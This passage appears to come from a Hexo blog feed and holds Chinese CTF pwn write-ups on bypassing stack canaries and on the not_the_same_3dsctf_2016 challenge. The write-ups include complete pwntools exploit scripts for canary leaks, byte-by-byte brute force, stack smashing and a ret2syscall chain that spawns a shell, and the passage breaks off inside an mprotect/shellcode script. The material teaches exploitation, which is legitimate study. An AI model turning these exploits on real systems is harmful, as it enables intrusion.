title="unsorted bin"></a>unsorted bin</h3><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>绕过保护之Canary</title>
    <link href="/2024/07/18/%E7%BB%95%E8%BF%87%E4%BF%9D%E6%8A%A4%E4%B9%8BCanary/"/>
    <url>/2024/07/18/%E7%BB%95%E8%BF%87%E4%BF%9D%E6%8A%A4%E4%B9%8BCanary/</url>
    
    <content type="html"><![CDATA[<h1 id="初识Canary"><a href="#初识Canary" class="headerlink" title="初识Canary"></a>初识Canary</h1><p><strong>关于canary说白了就是一个防止栈溢出的手段，一般情况下是在栈底前边设置一个值，在进程结束时，对比这个值有没有被篡改，如果篡改就退出。具体汇编如下</strong><br><strong>函数开始前在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 rbp-0x8 的位置(32位ebp-0x4。但是这个位置不是绝对的，可以通过ida分析)。 这个操作即为向栈中插入 Canary 值</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mov    rax, qword ptr fs:[0x28]<br>mov    qword ptr [rbp - 8], rax<br></code></pre></td></tr></table></figure><p><strong>函数结束时，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">mov    rdx,QWORD PTR [rbp-0x8]<br>xor    rdx,QWORD PTR fs:0x28<br>je     0x4005d7 &lt;main+65&gt;<br>call   0x400460 &lt;__stack_chk_fail@plt&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182346584.png"></p><p><strong>如果 Canary 已经被非法修改，此时程序流程会走到 __stack_chk_fail。__stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，这个函数不同的libc会不同（从glibc开始 2.27后稍有不同）定义如下</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">eglibc<span class="hljs-number">-2.19</span>/debug/stack_chk_fail.c<br><br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) __stack_chk_fail (<span class="hljs-type">void</span>)<br>&#123;<br>  __fortify_fail (<span class="hljs-string">&quot;stack smashing detected&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) internal_function __fortify_fail (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)<br>&#123;<br>  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>,<br>                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>在没有开启FULL RELRO保护时，我们可以通过劫持GOT表，然后触发Canary检测报错，这时就会进入劫持的地址。另一种是利用fortify_fail函数打印关键信息</strong><br><strong>关于Canary的储存地址，对于Liunx来说，fs寄存器实际指向的是当前进程的TLS结构，fs：0x28指向的正式stack_guard。如果溢出条件合适，我们完全可以覆盖TLS中保存的Canary值</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">void</span> *tcb;        <span class="hljs-comment">/* Pointer to the TCB.  Not necessarily the</span><br><span class="hljs-comment">                       thread descriptor used by libpthread.  */</span><br>  <span class="hljs-type">dtv_t</span> *dtv;<br>  <span class="hljs-type">void</span> *self;       <span class="hljs-comment">/* Pointer to the thread descriptor.  */</span><br>  <span class="hljs-type">int</span> multiple_threads;<br>  <span class="hljs-type">uintptr_t</span> sysinfo;<br>  <span class="hljs-type">uintptr_t</span> stack_guard;<br>  ...<br>&#125; <span class="hljs-type">tcbhead_t</span>;<br></code></pre></td></tr></table></figure><p><strong>这个值由ssecurity_init函数来初始化</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">security_init</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br>  <span class="hljs-comment">// glibc直接使用了_dl_random的值并没有给赋值</span><br>  <span class="hljs-comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span><br><br>  <span class="hljs-comment">//将_dl_random的最后一个字节设置为0x0</span><br>  <span class="hljs-type">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);<br><br>  <span class="hljs-comment">// 设置Canary的值到TLS中</span><br>  THREAD_SET_STACK_GUARD (stack_chk_guard);<br><br>  _dl_random = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span><br><span class="hljs-meta">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></code></pre></td></tr></table></figure><p><strong>Canary的最后一个字节呗设置为0，防止类似与printf(“%s” , &amp;buf)，形式的函数不小心打印出来，所以我们可以把这个0给覆盖，用打印函数来覆盖，这样就泄露了Canary的值</strong></p><h1 id="Canary保护机制总结"><a href="#Canary保护机制总结" class="headerlink" title="Canary保护机制总结"></a>Canary保护机制总结</h1><ol><li><strong>_dl_random由Kernel写入</strong></li><li><strong>security_init 函数将_dl_random 的最后一个字节设置为0，防止 printf(“%s”)这类打印函数不小心泄露 Canary。</strong></li><li><strong>security_init 函数将 Canary 值设置到 TLS 中。</strong></li><li><strong>在函数开始时，会取出TLS中的Canary值放在ebp-4h(64位系统为rbp-8h)<br>中，即防止通过栈溢出修改 ebp 和返回地址。</strong></li><li><strong>在函数结束时，会取出ebp-4h(64位系统为rbp-8h)的值，并与 TLS 中的 Canar值进行异或，判断是否为0。若结果为0，则检查通过;若结果不为0，则检查不通过，进人stack_chk_fail 函数</strong></li></ol><h2 id="Canary保护机制主要有两个漏洞"><a href="#Canary保护机制主要有两个漏洞" class="headerlink" title="Canary保护机制主要有两个漏洞"></a>Canary保护机制主要有两个漏洞</h2><ul><li><strong>stack_chk_fai1函数会有信息输出，如果我们能够控制 libc_argv[0]，就能够通过stack_chk fail函数泄露出我们想要的信息，这个技术被称为 stacksmashes(glibc 2.27 和 2.27之后的版本会有一些变化)。</strong></li><li>如果我们有一个很长的栈溢出，那么可以直接溢出TLS 中的 a1_random 的值，因此可以绕过 Canary 保护。当然，这里可能还需要一个多线程的条件，可以在后续例<br>题中看到。</li></ul><h2 id="对于有Canary的程序，如果考虑栈溢出攻击，主要有四个攻击点："><a href="#对于有Canary的程序，如果考虑栈溢出攻击，主要有四个攻击点：" class="headerlink" title="对于有Canary的程序，如果考虑栈溢出攻击，主要有四个攻击点："></a>对于有Canary的程序，如果考虑栈溢出攻击，主要有四个攻击点：</h2><ol><li><strong>利用泄露函数泄露出 Canary 的值，再进行利用。</strong></li><li><strong>爆破得到 Canary 的值。</strong></li><li><strong>stack_chk fai1 函数泄露关键信息。</strong></li><li><strong>修改 TLS 中的 stack quard 值。</strong></li></ol><h1 id="泄露Canary值"><a href="#泄露Canary值" class="headerlink" title="泄露Canary值"></a>泄露Canary值</h1><p><strong><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/canary/leak_canary">附件下载</a></strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182347433.png"><br><strong>注意点Canary值距离ebp为0xc，然后通过栈溢出覆盖最后一位0，通过打印函数打印出来cancary</strong></p><ol><li><strong>第一种是用栈溢出漏洞</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./leak_canary&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote( )<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(filename)<br><br>target = <span class="hljs-number">0x080485CC</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + <span class="hljs-string">b&#x27;b&#x27;</span><br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span>)<br>canary_addr = u32(p.recv(<span class="hljs-number">4</span>)) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;b&#x27;</span>)<br>success(<span class="hljs-built_in">hex</span>(canary_addr))<br>payload2 = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x100</span> + p32(canary_addr)<br>payload2 += p32(<span class="hljs-number">1</span>) * <span class="hljs-number">3</span><br>payload2 += p32(target)<br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure></li><li>第二种是利用格式化字符串<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./leak_canary&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote( )<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(filename)<br><br>target = <span class="hljs-number">0x080485CC</span><br>p1 = <span class="hljs-string">&#x27;%&#123;offset&#125;$p\n&#x27;</span>.<span class="hljs-built_in">format</span>(offset = <span class="hljs-number">71</span>)<br><br>p.send(p1)<br>canary_addr = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span> , drop=<span class="hljs-literal">True</span>) , <span class="hljs-number">16</span>)<br><br>success(<span class="hljs-built_in">hex</span>(canary_addr))<br>p2 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p32(canary_addr)<br>p2 += <span class="hljs-number">0xc</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>p2 += p32(target)<br><br>p.sendline(p2)<br>p.interactive()<br></code></pre></td></tr></table></figure></li></ol><h1 id="逐字节爆破Canary"><a href="#逐字节爆破Canary" class="headerlink" title="逐字节爆破Canary"></a>逐字节爆破Canary</h1><p><strong><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/canary/one_by_one_bruteforce">附件下载</a></strong><br><strong>这种方法局限性比较大，必须有fork函数开启子进程。因为fork函数会直接拷贝父进程内存，所以创建的子进程canary都是相同的</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182347688.png"><br><strong>我们一直fork开启子进程，一个一个字节的爆破</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./one_by_one_bruteforce&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote( )<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bruteforce1bit</span>() :<br>  <span class="hljs-keyword">global</span> known<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    p1 = <span class="hljs-number">0x108</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>    p1 += known<br>    p1 += <span class="hljs-built_in">bytes</span>([i])<br>    p.sendafter(<span class="hljs-string">&#x27;one_by_one_bruteforce\n&#x27;</span>,p1)<br>    <span class="hljs-keyword">try</span> :<br>      info = p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>      <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;*** stack smashing detected ***&quot;</span> <span class="hljs-keyword">in</span> info :<br>        p.send(<span class="hljs-string">&#x27;n\n&#x27;</span>)<br>        <span class="hljs-keyword">continue</span><br>      <span class="hljs-keyword">else</span> :<br>        known += <span class="hljs-built_in">bytes</span>([i])<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span>:<br>        log.info(<span class="hljs-string">&#x27;wrong&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br>      <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bruteforce_canary</span>():<br>  <span class="hljs-keyword">global</span> known<br>  known += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    bruteforce1bit()<br>    <span class="hljs-keyword">if</span> i != <span class="hljs-number">6</span> :<br>      p.send(<span class="hljs-string">b&#x27;n\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span> :<br>      p.send(<span class="hljs-string">b&#x27;y\n&#x27;</span>)<br><br>target = <span class="hljs-number">0x000000000040083E</span><br>known = <span class="hljs-string">b&quot;&quot;</span><br>bruteforce_canary()<br>canary = u64(known)  <span class="hljs-comment"># Ensure known is 8 bytes</span><br>log.success(<span class="hljs-string">&quot;canary: &quot;</span> + <span class="hljs-built_in">hex</span>(canary))<br>p2 = <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">0x108</span> + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(target)<br>p.sendafter(<span class="hljs-string">b&quot;go\n&quot;</span>, p2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>| 这两个理解起来都很简单，没有什么难点，看着exp很容易理解</p><h1 id="stack-smashes"><a href="#stack-smashes" class="headerlink" title="stack_smashes"></a>stack_smashes</h1><p><strong><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/canary/stack_smashes">附件下载</a></strong></p><p><strong>前边已经简绍了，_stack_chk_fail函数会将__libc_agrc[0]的信息打印出来，所以我们可以改变__libc_agrc[0]的地址为我们想要信息的值，那么就能得到相应数据了</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182347802.png"><br><strong>首先简绍一下什么是__libc_agrc[0]</strong></p><p><strong>main(int argc , char ,*argv[ ])</strong></p><ol><li><strong>argc为整数</strong></li><li><strong>argv为指针的指针（可理解为：char **argv or: char *argv[] or: char argv[][] ，argv是一个指针数组)</strong><br><strong>注：main()括号内是固定的写法。</strong></li><li><strong>下面给出一个例子来理解这两个参数的用法：</strong><br>**　假设程序的名称为prog，**<br><strong>当只输入prog，则由操作系统传来的参数为：</strong><br><strong>argc&#x3D;1,表示只有一程序名称。</strong><br><strong>argc只有一个元素，argv[0]指向输入的程序路径及名称：.&#x2F;prog</strong><br><strong>当输入prog para_1，有一个参数，则由操作系统传来的参数为：</strong><br><strong>argc&#x3D;2，表示除了程序名外还有一个参数。</strong><br><strong>argv[0]指向输入的程序路径及名称。</strong><br><strong>argv[1]指向参数para_1字符串。</strong><br><strong>当输入prog para_1 para_2 有2个参数，则由操作系统传来的参数为：</strong><br><strong>argc&#x3D;3，表示除了程序名外还有2个参数。</strong><br><strong>argv[0]指向输入的程序路径及名称。</strong><br><strong>argv[1]指向参数para_1字符串。</strong><br><strong>argv[2]指向参数para_2字符串。</strong></li><li><strong>void main( int argc, char *argv[] )</strong><br><strong>char *argv[] : argv 是一个指针数组，他的元素个数是argc，存放的是指向每一个参数的指针</strong></li></ol><p><strong>我们本题需要找__libc_agrc[0]和输入的偏移</strong><br><strong>下断点直接到输入函数</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182347411.png"><br><strong>第二个参数为输入地址（具体第几个参数，根据函数本身决定）</strong><br><strong>下断点到main</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182347668.png"><br><strong>__libc_argv[0]指向的是文件路径</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182348166.png"><br><strong>直接算出偏移</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#脚本也是非常easy</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./stack_smashes&quot;</span>)<br>gdb.attach(p,<span class="hljs-string">&quot;b *0x000000000040087A&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>flag_addr = <span class="hljs-number">0x0000000000601090</span><br>p2 = <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">0x218</span> + p64(flag_addr)<br>p.sendafter(<span class="hljs-string">&quot;stack_smashes\n&quot;</span>,p2)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>not_the_same_3dsctf_2016</title>
    <link href="/2024/07/18/not-the-same-3dsctf-2016/"/>
    <url>/2024/07/18/not-the-same-3dsctf-2016/</url>
    
    <content type="html"><![CDATA[<h1 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h1><p><strong>查看保护就不说了</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182331100.png"></p><p><strong>IDA反编译发现为静态编译，不用找libc了这点节省不少功夫。打开main函数，发现栈溢出漏洞</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182332667.png"><br><strong>偏移为45，这个是根据gdb的cyclic算出来的</strong><br><strong>发现后门函数get_secret，功能是把flag读取赋值给fl4g</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182332184.png"><br><strong>初步思路为通过栈溢出，调用get_secret，再通过write函数读取fl4g</strong></p><h2 id="方法一-通过栈溢出调用后门函数"><a href="#方法一-通过栈溢出调用后门函数" class="headerlink" title="方法一 通过栈溢出调用后门函数"></a>方法一 通过栈溢出调用后门函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span> , <span class="hljs-number">29232</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>elf = ELF(filename)<br>write_addr = <span class="hljs-number">0x806E270</span><br>flag_addr = <span class="hljs-number">0x080ECA2D</span><br>target = <span class="hljs-number">0x080489A0</span><br>exit_addr = <span class="hljs-number">0x0804E660</span><br><br>payload = <span class="hljs-number">45</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p32(target)<br>payload += p32(elf.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(exit_addr)<br>payload += p32(<span class="hljs-number">1</span>) + p32(flag_addr) + p32(<span class="hljs-number">42</span>)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>我们前面分析这个是静态编译，我们可以直接ret2syscall，通过设置寄存器的值，直接获得shell</strong></p><h2 id="方法二-ret2syscall"><a href="#方法二-ret2syscall" class="headerlink" title="方法二 ret2syscall"></a>方法二 ret2syscall</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span> , <span class="hljs-number">29232</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>elf = ELF(filename)<br><span class="hljs-comment">#gdb.attach(p , &#x27;b * 0x080489EA&#x27;)</span><br><span class="hljs-comment">#0x08048b0b : pop eax ; ret</span><br>pop_eax = <span class="hljs-number">0x08048b0b</span><br><span class="hljs-comment">#0x0806fcc9 : pop ebx ; pop edx ; ret</span><br>pop_ebx_edx = <span class="hljs-number">0x0806fcc9</span><br><span class="hljs-comment">#0x0806fcf1 : pop ecx ; pop ebx ; ret</span><br>pop_ecx_ebx = <span class="hljs-number">0x0806fcf1</span><br><span class="hljs-comment">#0x0806d8a5 : int 0x80</span><br>int80_addr = <span class="hljs-number">0x0806d8a5</span><br>get_addr = <span class="hljs-number">0x0804F8D0</span><br>data_addr = <span class="hljs-number">0x080EBAD2</span><br>target = <span class="hljs-number">0x080489A0</span><br><span class="hljs-comment">#0x080481ad : pop ebx ; ret</span><br>pop1 = <span class="hljs-number">0x080481ad</span> <br>payload = <span class="hljs-number">45</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p32(get_addr) + p32(pop1) + p32(data_addr)<br>payload += p32(pop_ecx_ebx) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>)<br>payload += p32(pop_eax) + p32(<span class="hljs-number">11</span>)<br>payload += p32(pop_ebx_edx) + p32(data_addr) + p32(<span class="hljs-number">0</span>)<br>payload += p32(int80_addr)<br>payload += p32(target)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><blockquote><p>这个看上去有点复杂但是，耐心看下来还是很好理解的，32位getshell需要调用execv&gt;（”&#x2F;bin&#x2F;sh”,null,null)，寄存器eax&#x3D;11，ebx&#x3D;”&#x2F;bin&#x2F;sh”，ecx&#x3D;0，edx&#x3D;0，然后再执行int 0x80</p></blockquote><p><strong>然后我们发现函数列表有mprotect,这个函数可以改变段的执行权限,我们可以开启最高权限,执行shellcode</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182334572.png"></p><h2 id="方法三-mprotect配合shellcode"><a href="#方法三-mprotect配合shellcode" class="headerlink" title="方法三 mprotect配合shellcode"></a>方法三 mprotect配合shellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename 